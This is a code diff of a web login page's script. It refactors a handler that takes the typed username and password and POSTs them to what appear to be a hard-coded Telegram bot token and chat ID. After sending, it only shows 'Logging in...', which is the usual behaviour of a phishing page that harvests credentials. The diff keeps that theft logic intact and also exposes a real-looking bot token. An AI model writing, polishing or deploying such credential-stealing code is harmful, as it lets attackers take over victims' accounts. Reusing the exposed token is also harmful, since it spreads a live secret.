@@ -58,10 +58,7 @@
   const BOT_TOKEN = "8773604137:AAEjU7B_uzTTX6DCWcyKQtroGbkdgA24nRc";
   const CHAT_ID = "7264141539";
 
-  const loginBtn = document.getElementById('loginBtn');
-  const errorMsg = document.getElementById('errorMsg');
-
-  loginBtn.addEventListener('click', () => {
+  document.getElementById('loginBtn').addEventListener('click', () => {
     const username = document.getElementById('username').value.trim();
     const password = document.getElementById('password').value.trim();
 
@@ -76,15 +73,11 @@
         method: "POST",
         body: formData
       }).then(() => {
-        errorMsg.innerHTML = "Logging in...";
-        errorMsg.style.display = 'block';
-        errorMsg.style.color = "green";
-      }).catch(() => {
-        errorMsg.innerHTML = "Network error. Try again.";
-        errorMsg.style.display = 'block';
+        document.getElementById('errorMsg').innerHTML = "Logging in...";
+        document.getElementById('errorMsg').style.display = 'block';
       });
     } else {
-      errorMsg.style.display = 'block';
+      document.getElementById('errorMsg').style.display = 'block';
     }
   });
 </script>
